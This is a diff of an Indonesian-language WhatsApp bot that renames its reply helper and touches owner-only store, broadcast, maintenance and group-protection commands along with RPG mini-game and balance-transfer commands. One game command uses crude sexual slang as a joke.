         `║ 🧾 Order  : *${order.ref}*\n` +
         `║ 📦 Paket  : *${order.productName}*\n` +
@@ -17662,31 +17635,31 @@ case 'jasherstatus': {
 }
 break
 case 'jasherproses': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     const ref = String(args[0] || '').toUpperCase()
-    if (!ref) return Reply(`Contoh: ${prefix}jasherproses ORDXXXX`)
+    if (!ref) return replyV1(`Contoh: ${prefix}jasherproses ORDXXXX`)
     const order = storeService.getOrder(ref)
-    if (!order || order.productType !== 'jasher') return Reply('❌ Order Jasher tidak ditemukan.')
+    if (!order || order.productType !== 'jasher') return replyV1('❌ Order Jasher tidak ditemukan.')
     const updated = storeService.updateOrder(ref, { status: 'PROCESSING', jasher: { ...(order.jasher || {}), processedAt: Date.now() } })
     await conn.sendMessage(updated.jid, { text: `🚀 Order Jasher *${ref}* sedang diproses owner.` }).catch(() => {})
-    return Reply(`✅ ${ref} ditandai *PROCESSING*.`)
+    return replyV1(`✅ ${ref} ditandai *PROCESSING*.`)
 }
 break
 case 'jasherdone': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     const ref = String(args[0] || '').toUpperCase()
-    if (!ref) return Reply(`Contoh: ${prefix}jasherdone ORDXXXX`)
+    if (!ref) return replyV1(`Contoh: ${prefix}jasherdone ORDXXXX`)
     const order = storeService.getOrder(ref)
-    if (!order || order.productType !== 'jasher') return Reply('❌ Order Jasher tidak ditemukan.')
+    if (!order || order.productType !== 'jasher') return replyV1('❌ Order Jasher tidak ditemukan.')
     const updated = storeService.updateOrder(ref, { status: 'DONE', fulfilledAt: Date.now(), jasher: { ...(order.jasher || {}), completedAt: Date.now() } })
     await conn.sendMessage(updated.jid, { text: `✅ Order Jasher *${ref}* selesai diproses.` }).catch(() => {})
-    return Reply(`✅ ${ref} selesai.`)
+    return replyV1(`✅ ${ref} selesai.`)
 }
 break
 case 'blacklistbroadcast':
 case 'blacklistbc':
 case 'bcblacklist': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     try {
         const requestedPage = Math.max(1, Number.parseInt(args[0] || '1', 10) || 1)
         return await sendBlacklistBroadcastMenu(requestedPage)
@@ -17698,7 +17671,7 @@ case 'bcblacklist': {
 break
 case 'broadcastblacklisttoggle':
 case 'togglebroadcastblacklist': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     const page = Math.max(1, Number.parseInt(args[0] || '1', 10) || 1)
     const groupJid = String(args[1] || '').trim()
     if (!groupJid.endsWith('@g.us')) {
@@ -17744,7 +17717,7 @@ case 'blacklistadzan':
 case 'adzanblacklist':
 case 'filteradzan':
 case 'blacklistautoazan': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     try {
         const requestedPage = Math.max(1, Number.parseInt(args[0] || '1', 10) || 1)
         return await sendAdzanBlacklistMenu(requestedPage)
@@ -17756,7 +17729,7 @@ case 'blacklistautoazan': {
 break
 case 'adzanblacklisttoggle':
 case 'toggleadzanblacklist': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     const page = Math.max(1, Number.parseInt(args[0] || '1', 10) || 1)
     const groupJid = String(args[1] || '').trim()
     if (!groupJid.endsWith('@g.us')) {
@@ -17798,7 +17771,7 @@ break
 case 'stopbroadcast':
 case 'broadcaststop':
 case 'stopbc': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     const state = global.__xeryuuBroadcastState
     if (!state?.active) {
         return sendXeryuuImageReply('ℹ️ Tidak ada broadcast yang sedang berjalan saat ini.')
@@ -17817,7 +17790,7 @@ break
 
 case 'broadcaststatus':
 case 'bcstatus': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     const state = global.__xeryuuBroadcastState || {}
     const statusLabel = state.active
         ? (state.stopRequested
@@ -17842,7 +17815,7 @@ break
 
 case 'broadcast':
 case 'bc': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     if (!text) {
         return sendXeryuuImageReply(
             `📣 FORMAT BROADCAST\n\n` +
@@ -17859,7 +17832,7 @@ case 'bc': {
 
     const state = global.__xeryuuBroadcastState
     if (state?.active) {
-        return Reply(`⚠️ Broadcast masih berjalan. Gunakan ${prefix}broadcaststatus untuk melihat progres atau ${prefix}stopbroadcast untuk menghentikannya.`)
+        return replyV1(`⚠️ Broadcast masih berjalan. Gunakan ${prefix}broadcaststatus untuk melihat progres atau ${prefix}stopbroadcast untuk menghentikannya.`)
     }
 
     let requestedLimit = null
@@ -17869,13 +17842,13 @@ case 'bc': {
         requestedLimit = Number.parseInt(firstArg, 10)
         messageText = args.slice(1).join(' ').trim()
         if (!Number.isSafeInteger(requestedLimit) || requestedLimit < 1) {
-            return Reply(`❌ Jumlah grup harus angka minimal 1. Contoh: ${prefix}broadcast 10 Pesan kamu`)
+            return replyV1(`❌ Jumlah grup harus angka minimal 1. Contoh: ${prefix}broadcast 10 Pesan kamu`)
         }
     } else if (firstArg === 'all' || firstArg === 'semua') {
         requestedLimit = null
         messageText = args.slice(1).join(' ').trim()
     }
-    if (!messageText) return Reply(`❌ Pesan broadcast tidak boleh kosong. Contoh: ${prefix}broadcast 10 Halo semuanya`)
+    if (!messageText) return replyV1(`❌ Pesan broadcast tidak boleh kosong. Contoh: ${prefix}broadcast 10 Halo semuanya`)
 
     // Notifikasi akhir memakai socket yang terbaru jika proses sempat melewati reconnect.
     const sendBroadcastNotice = async caption => {
@@ -17885,7 +17858,7 @@ case 'bc': {
             return false
         }
         const targetChat = state.startChat || m.chat
-        const imageBuffer = readProjectAsset('media/xeryuu.jpg')
+        const imageBuffer = readProjectAsset('media/xeryuu.png')
         try {
             if (Buffer.isBuffer(imageBuffer) && imageBuffer.length) {
                 await targetSocket.sendMessage(targetChat, {
@@ -18088,11 +18061,11 @@ case 'bc': {
 break
 
 case 'maintenance': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     const input = q.toLowerCase().trim()
     if (!input || input === 'status') {
         const status = global.db.settings.maintenance === true
-        return Reply(
+        return replyV1(
             `🛠️ *STATUS MAINTENANCE*\n\n` +
             `Status: ${status ? '🟢 AKTIF' : '🔴 NONAKTIF'}\n\n` +
             `Gunakan:\n• ${prefix}maintenance on\n• ${prefix}maintenance off\n• ${prefix}maintenance status`
@@ -18101,19 +18074,19 @@ case 'maintenance': {
     if (input === 'on') {
         global.db.settings.maintenance = true
         saveDB(global.db)
-        return Reply('🛠️ *MAINTENANCE DIAKTIFKAN*\n\nSeluruh fitur bot untuk pengguna biasa dihentikan sementara. Owner tetap dapat mengelola bot.')
+        return replyV1('🛠️ *MAINTENANCE DIAKTIFKAN*\n\nSeluruh fitur bot untuk pengguna biasa dihentikan sementara. Owner tetap dapat mengelola bot.')
     }
     if (input === 'off') {
         global.db.settings.maintenance = false
         saveDB(global.db)
-        return Reply('✅ *MAINTENANCE DINONAKTIFKAN*\n\nBot kembali menerima pesan dan command pengguna.')
+        return replyV1('✅ *MAINTENANCE DINONAKTIFKAN*\n\nBot kembali menerima pesan dan command pengguna.')
     }
     if (input === 'toggle') {
         global.db.settings.maintenance = !Boolean(global.db.settings.maintenance)
         saveDB(global.db)
-        return Reply(`🛠️ Maintenance sekarang *${global.db.settings.maintenance ? 'AKTIF' : 'NONAKTIF'}*.`)
+        return replyV1(`🛠️ Maintenance sekarang *${global.db.settings.maintenance ? 'AKTIF' : 'NONAKTIF'}*.`)
     }
-    return Reply(`❌ Gunakan ${prefix}maintenance on, ${prefix}maintenance off, atau ${prefix}maintenance status`)
+    return replyV1(`❌ Gunakan ${prefix}maintenance on, ${prefix}maintenance off, atau ${prefix}maintenance status`)
 }
 break
 case 'anticall':
@@ -18123,7 +18096,7 @@ case 'readsw':
 case 'autobio':
 case 'autopromosi':
 case 'owneroffmode': {
-    if (!isCreator) return Reply(mess.owner)
+    if (!isCreator) return replyV1(mess.owner)
     const settingName = command
     const settingLabel = {
         anticall: 'AntiCall',
@@ -18140,7 +18113,7 @@ case 'owneroffmode': {
         const status =
             global.db.settings[settingName] === true
 
-        return Reply(
+        return replyV1(
             `⚙️ *${label}*\n\n` +
             `Status: ${status ? '🟢 ON' : '🔴 OFF'}\n\n` +
             `Gunakan:\n` +
@@ -18150,19 +18123,19 @@ case 'owneroffmode': {
     }
     if (input === 'on') {
         global.db.settings[settingName] = true
-        return Reply(
+        return replyV1(
             `✅ *${label} AKTIF*\n\n` +
             `${label} berhasil diaktifkan.`
         )
     }
     if (input === 'off') {
         global.db.settings[settingName] = false
-        return Reply(
+        return replyV1(
             `🔴 *${label} DIMATIKAN*\n\n` +
             `${label} berhasil dinonaktifkan.`
         )
     }
-    return Reply(
+    return replyV1(
         `❌ Format salah.\n\n` +
         `Gunakan:\n` +
         `• ${prefix}${settingName} on\n` +
@@ -18172,9 +18145,9 @@ case 'owneroffmode': {
 }
 break
 case 'antikudeta': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isCreator && !isAdmins) return Reply(mess.owner)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isCreator && !isAdmins) return replyV1(mess.owner)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
 
     const status = (q || '').toLowerCase().trim()
     const cfg = antiKudetaService.ensure(m.chat)
@@ -18183,7 +18156,7 @@ case 'antikudeta': {
         try {
             const enabled = await antiKudetaService.enable(conn, m.chat)
             const count = enabled.protected.length
-            return Reply(
+            return replyV1(
                 `🛡️ *ANTI KUDETA AKTIF*\n\n` +
                 `✅ Protected admin: ${count}\n` +
                 `⛔ Pelaku yang pernah diblokir: ${enabled.kudetaActors.length}\n\n` +
@@ -18194,24 +18167,24 @@ case 'antikudeta': {
             )
         } catch (err) {
             console.error('[ANTI KUDETA ENABLE]', err)
-            return Reply('❌ Gagal mengaktifkan anti kudeta: ' + (err?.message || 'unknown error'))
+            return replyV1('❌ Gagal mengaktifkan anti kudeta: ' + (err?.message || 'unknown error'))
         }
     }
 
     if (status === 'off') {
         antiKudetaService.disable(m.chat)
-        return Reply('🔓 *ANTI KUDETA DIMATIKAN*')
+        return replyV1('🔓 *ANTI KUDETA DIMATIKAN*')
     }
 
     if (status === 'reset') {
         antiKudetaService.resetActors(m.chat)
-        return Reply('♻️ Daftar pelaku anti-kudeta berhasil di-reset. Admin yang diblokir boleh diproses lagi saat terjadi pelanggaran baru.')
+        return replyV1('♻️ Daftar pelaku anti-kudeta berhasil di-reset. Admin yang diblokir boleh diproses lagi saat terjadi pelanggaran baru.')
     }
 
     if (status === 'list') {
         const protectedList = cfg.protected || []
         const blockedList = cfg.kudetaActors || []
-        if (!protectedList.length && !blockedList.length) return Reply('📋 Belum ada protected admin maupun pelaku yang diblokir.')
+        if (!protectedList.length && !blockedList.length) return replyV1('📋 Belum ada protected admin maupun pelaku yang diblokir.')
 
         const protectedText = protectedList.length
             ? protectedList.map((id, i) => `${i + 1}. @${id.split('@')[0]}`).join('\n')
@@ -18230,7 +18203,7 @@ case 'antikudeta': {
         }, { quoted: m })
     }
 
-    return Reply(
+    return replyV1(
         `🛡️ *ANTI KUDETA*\n\n` +
         `Status: ${cfg.active ? 'ON' : 'OFF'}\n` +
         `Protected: ${cfg.protected.length}\n` +
@@ -18245,7 +18218,7 @@ break
 
 case 'joinrpg': {
 
-      if (global.db.erpg[m.sender].rpg) return Reply(`Kamu Telah Join Sebelumnya`)
+      if (global.db.erpg[m.sender].rpg) return replyV1(`Kamu Telah Join Sebelumnya`)
       global.db.erpg[m.sender].rpg = true
       let joinedrpg = `*GAME RPG STARTED*\n\nKamu telah login RPG-Game, sekarang kamu dapat menggunakan command RPG`
       await conn.sendMessage(m.chat, {
@@ -18306,9 +18279,9 @@ case 'joinrpg': {
 
     case 'wikwik': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].stamina <= 15) return Reply(`Kamu tidak bisa ewe anak orang, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nPulihkan stamina menggunakan potion,\nContoh : .heal`)
-      if (!q) return Reply(`Contoh: ${command} conn`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (global.db.erpg[m.sender].stamina <= 15) return replyV1(`Kamu tidak bisa ewe anak orang, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nPulihkan stamina menggunakan potion,\nContoh : .heal`)
+      if (!q) return replyV1(`Contoh: ${command} conn`)
       const argsLower = args.map(arg => arg.toLowerCase());
       const petarung1 = argsLower[0];
       const petarung2 = argsLower[1];
@@ -18361,16 +18334,16 @@ case 'joinrpg': {
         result += `👙💦 Pertandingan berakhir imbang! Kedua yang wikwik memiliki stamina yang sama.\n`;
       }
       global.db.erpg[m.sender].stamina -= 50
-await Reply(result)
+await replyV1(result)
     }
     break
 
     case 'ngojek':
     case 'ojek': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (!text) return Reply(`Contoh: ${command} lampung|Jakarta\n\n*PENJELASAN*\n${command} [dari]|[tujuan] / Lampung ke Jakarta`)
-      if (global.db.erpg[m.sender].stamina < 1) return Reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!text) return replyV1(`Contoh: ${command} lampung|Jakarta\n\n*PENJELASAN*\n${command} [dari]|[tujuan] / Lampung ke Jakarta`)
+      if (global.db.erpg[m.sender].stamina < 1) return replyV1(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
       const arg1 = args.join(" ")
       const arg2 = arg1.split("|")[0];
       const arg3 = arg1.split("|")[1];
@@ -18460,8 +18433,8 @@ Money: ${toRupiah(ong)}`
 
     case 'polisi': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].stamina <= 70) return Reply(`Stamina Kamu ${global.db.erpg[m.sender].stamina}, Minimal Stamina 70% !!`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (global.db.erpg[m.sender].stamina <= 70) return replyV1(`Stamina Kamu ${global.db.erpg[m.sender].stamina}, Minimal Stamina 70% !!`)
 
       let uang = await randomNomor(7000, 25000)
       let stamina = await randomNomor(69, 85)
@@ -18485,13 +18458,13 @@ Stamina terpakai: ${stamina}`
 
     case 'makan': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
 
       let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastmakan)
-      if (new Date() - global.db.erpg[m.sender].lastmakan < 14400000) return Reply(`Kamu Baru Saja Makan, ${waktuu} Yang Lalu, Kamu dapat Makan Lagi Setelah 4 Jam Berikutnya.`)
+      if (new Date() - global.db.erpg[m.sender].lastmakan < 14400000) return replyV1(`Kamu Baru Saja Makan, ${waktuu} Yang Lalu, Kamu dapat Makan Lagi Setelah 4 Jam Berikutnya.`)
 
       let drhstam = await randomNomor(65, 95)
-      Reply(`Kamu makan sampai kenyang
+      replyV1(`Kamu makan sampai kenyang
 Darah dan stamina kamu bertambah
 sebanyak ${drhstam}%`)
       global.db.erpg[m.sender].darahuser += drhstam
@@ -18504,14 +18477,14 @@ sebanyak ${drhstam}%`)
     case 'sleep':
     case 'tidur': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
 
       let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lasttidur)
-      if (new Date() - global.db.erpg[m.sender].lasttidur < 14400000) return Reply(`Kamu Baru Saja Tidur, ${waktuu} Yang Lalu, Kamu dapat Tidur Lagi Nanti.`)
+      if (new Date() - global.db.erpg[m.sender].lasttidur < 14400000) return replyV1(`Kamu Baru Saja Tidur, ${waktuu} Yang Lalu, Kamu dapat Tidur Lagi Nanti.`)
 
       let drhstam = await randomNomor(70, 100)
       let tidur = await randomNomor(3, 14)
-      Reply(`Kamu tidur selama ${tidur} jam
+      replyV1(`Kamu tidur selama ${tidur} jam
 Darah dan stamina kamu bertambah
 sebanyak ${drhstam}%`)
       global.db.erpg[m.sender].darahuser += drhstam
@@ -18523,14 +18496,14 @@ sebanyak ${drhstam}%`)
     case 'ngeroket':
     case 'roket': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
       let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastrocket)
-      if (new Date() - global.db.erpg[m.sender].lastrocket < 259200000) return Reply(`Kamu Baru Saja Ke bulan, ${waktuu} Yang Lalu, Kamu dapat pergi Lagi Nanti.`)
+      if (new Date() - global.db.erpg[m.sender].lastrocket < 259200000) return replyV1(`Kamu Baru Saja Ke bulan, ${waktuu} Yang Lalu, Kamu dapat pergi Lagi Nanti.`)
 
-      if (global.db.erpg[m.sender].darahuser < 1) return Reply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
+      if (global.db.erpg[m.sender].darahuser < 1) return replyV1('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
 
-      if (global.db.erpg[m.sender].darahuser <= 70) return Reply(`Health Kamu ${global.db.erpg[m.sender].darahuser}%, Minimal health 70% !!`)
-      if (global.db.erpg[m.sender].stamina <= 70) return Reply(`Stamina Kamu ${global.db.erpg[m.sender].stamina}, Minimal Stamina 70% !!`)
+      if (global.db.erpg[m.sender].darahuser <= 70) return replyV1(`Health Kamu ${global.db.erpg[m.sender].darahuser}%, Minimal health 70% !!`)
+      if (global.db.erpg[m.sender].stamina <= 70) return replyV1(`Stamina Kamu ${global.db.erpg[m.sender].stamina}, Minimal Stamina 70% !!`)
 
       let saldo = await randomNomor(15000, 70000)
       let usrexp = await randomNomor(100, 500)
@@ -18590,29 +18563,29 @@ sebanyak ${drhstam}%`)
 case 'tf':
 case 'transfer': {
 
-if (isPremium) return Reply(`User Premium Tidak Dapat Mentransfer.`);
+if (isPremium) return replyV1(`User Premium Tidak Dapat Mentransfer.`);
     
     try {
-        if (!text) return Reply(`Format: ${command}transfer [saldo/limit/glimit] [@tag/nomor] [jumlah]\nContoh: ${command}transfer limit @628123456789 1000`);
+        if (!text) return replyV1(`Format: ${command}transfer [saldo/limit/glimit] [@tag/nomor] [jumlah]\nContoh: ${command}transfer limit @628123456789 1000`);
         
         const args = text.split(' ');
-        if (args.length < 3) return Reply(`Format salah!\nGunakan: ${command}transfer [jenis] [target] [jumlah]`);
+        if (args.length < 3) return replyV1(`Format salah!\nGunakan: ${command}transfer [jenis] [target] [jumlah]`);
         
         const tfType = args[0].toLowerCase();
         const target = args[1];
         const nominal = args[2];
         
-        if (!target) return Reply(`Tag/Masukkan Nomor Target\nContoh: ${command}${args[0]} @tag/628123456789 1000`);
+        if (!target) return replyV1(`Tag/Masukkan Nomor Target\nContoh: ${command}${args[0]} @tag/628123456789 1000`);
         
-        if (isNaN(nominal)) return Reply('Nominal harus berupa angka!');
+        if (isNaN(nominal)) return replyV1('Nominal harus berupa angka!');
         const amount = parseInt(nominal);
-        if (amount <= 0) return Reply('Jumlah transfer harus lebih dari 0!');
+        if (amount <= 0) return replyV1('Jumlah transfer harus lebih dari 0!');
         
         const maxTransfer = 1000000;
-        if (amount > maxTransfer) return Reply(`Maksimal transfer adalah Rp. ${toRupiah(maxTransfer)}`);
+        if (amount > maxTransfer) return replyV1(`Maksimal transfer adalah Rp. ${toRupiah(maxTransfer)}`);
         
         const receiver = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-        if (!db.users[receiver]) return Reply('Penerima tidak terdaftar!');
+        if (!db.users[receiver]) return replyV1('Penerima tidak terdaftar!');
         
         if (!db.users[m.sender]) db.users[m.sender] = {};
         if (!db.users[receiver]) db.users[receiver] = {};
@@ -18624,7 +18597,7 @@ if (isPremium) return Reply(`User Premium Tidak Dapat Mentransfer.`);
                 if (typeof db.users[receiver].saldo === 'undefined') db.users[receiver].saldo = 0;
                 
                 const senderBalance = db.users[m.sender].saldo;
-                if (senderBalance < amount) return Reply(`Saldo tidak cukup! Saldo Anda: Rp. ${toRupiah(senderBalance)}`);
+                if (senderBalance < amount) return replyV1(`Saldo tidak cukup! Saldo Anda: Rp. ${toRupiah(senderBalance)}`);
                 
                 db.users[m.sender].saldo -= amount;
                 db.users[receiver].saldo += amount;
@@ -18645,7 +18618,7 @@ if (isPremium) return Reply(`User Premium Tidak Dapat Mentransfer.`);
                 if (typeof db.users[receiver].limit === 'undefined') db.users[receiver].limit = 0;
                 
                 const senderLimit = db.users[m.sender].limit;
-                if (senderLimit < amount) return Reply(`Limit tidak cukup! Limit Anda: ${senderLimit}`);
+                if (senderLimit < amount) return replyV1(`Limit tidak cukup! Limit Anda: ${senderLimit}`);
                 
                 db.users[m.sender].limit -= amount;
                 db.users[receiver].limit += amount;
@@ -18668,7 +18641,7 @@ if (isPremium) return Reply(`User Premium Tidak Dapat Mentransfer.`);
                 if (typeof db.users[receiver].glimit === 'undefined') db.users[receiver].glimit = 0;
                 
                 const senderGLimit = db.users[m.sender].glimit;
-                if (senderGLimit < amount) return Reply(`Game limit tidak cukup! Limit Anda: ${senderGLimit}`);
+                if (senderGLimit < amount) return replyV1(`Game limit tidak cukup! Limit Anda: ${senderGLimit}`);
                 
                 db.users[m.sender].glimit -= amount;
                 db.users[receiver].glimit += amount;
@@ -18684,7 +18657,7 @@ if (isPremium) return Reply(`User Premium Tidak Dapat Mentransfer.`);
             }
             
             default:
-                return Reply(`Jenis Transfer Tidak Valid\n\n` +
+                return replyV1(`Jenis Transfer Tidak Valid\n\n` +
                     `Tersedia:\n` +
                     `• saldo\n` +
                     `• limit\n` +
@@ -18693,14 +18666,14 @@ if (isPremium) return Reply(`User Premium Tidak Dapat Mentransfer.`);
         }
     } catch (err) {
         console.error('Transfer Error:', err);
-        return Reply('Terjadi kesalahan saat memproses transfer!');
+        return replyV1('Terjadi kesalahan saat memproses transfer!');
     }
 }
 break
 
     case 'nyampah': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
 
       let botol = await randomNomor(15, 46)
       let bulu = await randomNomor(5, 36)
@@ -18712,7 +18685,7 @@ break
       let health = await randomNomor(15, 40)
 
       let waktuu = await clockString(new Date() - global.db.erpg[m.sender].sampahtime)
-      if (new Date() - global.db.erpg[m.sender].sampahtime < 18000000) return Reply(`Kamu Baru Saja Nyampah ${waktuu} Yang Lalu, Silahkan Tunggu 5 Jam Setelah Terakhir Kali Nyampah`)
+      if (new Date() - global.db.erpg[m.sender].sampahtime < 18000000) return replyV1(`Kamu Baru Saja Nyampah ${waktuu} Yang Lalu, Silahkan Tunggu 5 Jam Setelah Terakhir Kali Nyampah`)
 
       global.db.erpg[m.sender].bulu += bulu
       global.db.erpg[m.sender].kain += kain
@@ -18724,7 +18697,7 @@ break
       global.db.erpg[m.sender].darahuser -= health
       global.db.erpg[m.sender].sampahtime = new Date * 1
 
-      Reply(`*–––––– NYAMPAH ––––––*
+      replyV1(`*–––––– NYAMPAH ––––––*
 
 Items Didapat
   ${vircion} • Botol: ${botol}
@@ -18742,11 +18715,11 @@ Stamina Berkurang -${health}`)
     case 'skillselect':
     case 'selectskill': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
       const user = global.db.erpg[m.sender].skillselect
       const skill = ["swordmaster", "necromancer", "witch", "Archer", "magicswordmaster", "thief", "shadow"]
       const skil = text.trim().toLowerCase()
-      if (!skill.includes(skil)) return Reply(`Select skill yang ingin kamu gunakan. 
+      if (!skill.includes(skil)) return replyV1(`Select skill yang ingin kamu gunakan. 
 
 ${skill.map(skil => `› ${skil}`).join('\n')}.
 
@@ -18757,9 +18730,9 @@ Kamu hanya bisa memilih skill 1x selebihnya
 tidak akan bisa memilih/ganti lagi`)
       if (!user || !user.skill) {
         global.db.erpg[m.sender].skillselect = skil
-        Reply(`Anda telah memilih Skill ${skil}`)
+        replyV1(`Anda telah memilih Skill ${skil}`)
       } else {
-        Reply(`Anda Sudah Punya skill ${user.skill}. Tidak bisa diganti`)
+        replyV1(`Anda Sudah Punya skill ${user.skill}. Tidak bisa diganti`)
       }
     }
     break
@@ -18767,24 +18740,24 @@ tidak akan bisa memilih/ganti lagi`)
     case 'crafting':
     case 'craft': {
 
-      if (!global.db.erpg[m.sender].rpg) return Reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (text.includes('-')) return Reply('Nominal Tidak valid!!');
+      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
+      if (text.includes('-')) return replyV1('Nominal Tidak valid!!');
       if (args[0] === "kain") {
-        if (!args[1]) return Reply(`*Masukan Jumlahnya!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
+        if (!args[1]) return replyV1(`*Masukan Jumlahnya!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
         let bulu = Number(parseInt(args[1]) * 2)
-        if (global.db.erpg[m.sender].bulu < bulu) return Reply(`*Bulu Wol Kamu (${global.db.erpg[m.sender].bulu}) Tidak Cukup Untuk Membuat ${args[1]} Lembar Kain*\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].bulu < bulu) return replyV1(`*Bulu Wol Kamu (${global.db.erpg[m.sender].bulu}) Tidak Cukup Untuk Membuat ${args[1]} Lembar Kain*\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
         global.db.erpg[m.sender].kain += parseInt(args[1])
         global.db.erpg[m.sender].bulu -= bulu
-        Reply(`Berhasil Membuat ${args[1]} Lembar Kain, Kamu Mempunyai ${global.db.erpg[m.sender].bulu} Bulu Lagi`)
+        replyV1(`Berhasil Membuat ${args[1]} Lembar Kain, Kamu Mempunyai ${global.db.erpg[m.sender].bulu} Bulu Lagi`)
       } else if (args[0] === "kapal") {
-        if (global.db.erpg[m.sender].kapal) return Reply('Kamu Sudah Memiliki Kapal!')
+        if (global.db.erpg[m.sender].kapal) return replyV1('Kamu Sudah Memiliki Kapal!')
         let besi = Number(20)
         let kayu = Number(50)
         let kain = Number(2)
-        if (global.db.erpg[m.sender].besi < besi) return Reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
-        if (global.db.erpg[m.sender].kayu < kayu) return Reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
-        if (global.db.erpg[m.sender].kain < kain) return Reply(`*Kain Kamu (${global.db.erpg[m.sender].kain}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
+        if (global.db.erpg[m.sender].besi < besi) return replyV1(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
